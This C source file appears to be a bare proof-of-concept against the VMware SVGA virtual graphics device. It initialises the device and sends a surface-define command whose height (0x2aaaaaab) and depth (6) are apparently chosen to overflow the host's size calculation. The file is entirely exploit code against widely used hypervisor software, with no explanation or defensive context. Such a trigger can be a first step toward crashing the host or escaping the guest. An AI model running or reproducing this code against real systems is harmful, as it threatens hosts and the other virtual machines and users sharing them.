#include <err.h>
#include <stdlib.h>

#include "svga.h"
#include "svga3d_reg.h"

SVGADevice gSVGA;

int main(int argc, char **argv)
{

	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};

	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x260);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);

	hdr.size = 48;

	surface.sid = 0;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	dsize[0].width  = 0x1;
	dsize[0].height = 0x2aaaaaab;
	dsize[0].depth  = 0x6;

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE); 
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();

	return 0;
}
